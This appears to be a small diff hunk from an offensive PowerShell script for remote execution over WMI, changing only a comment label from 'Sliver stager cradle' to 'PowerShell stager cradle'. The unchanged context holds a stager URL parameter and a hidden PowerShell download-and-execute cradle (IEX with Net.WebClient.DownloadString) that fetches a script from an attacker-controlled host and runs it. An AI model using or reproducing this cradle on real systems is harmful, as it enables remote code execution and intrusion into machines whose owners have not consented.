@@ -11,7 +11,7 @@ param(
     [Parameter(Mandatory = $false)][string]$StagerUrl = "http://<IP>/run.ps1"
 )
 
-# ── Remote command (Sliver stager cradle) ──────────────────────────────────
+# ── Remote command (PowerShell stager cradle) ───────────────────────────────
 $cmd = "powershell.exe -nop -w hidden -c `"IEX(New-Object Net.WebClient).DownloadString('$StagerUrl')`""
 
 # ── Method 1: Invoke-WmiMethod (PS 3+) ────────────────────────────────────
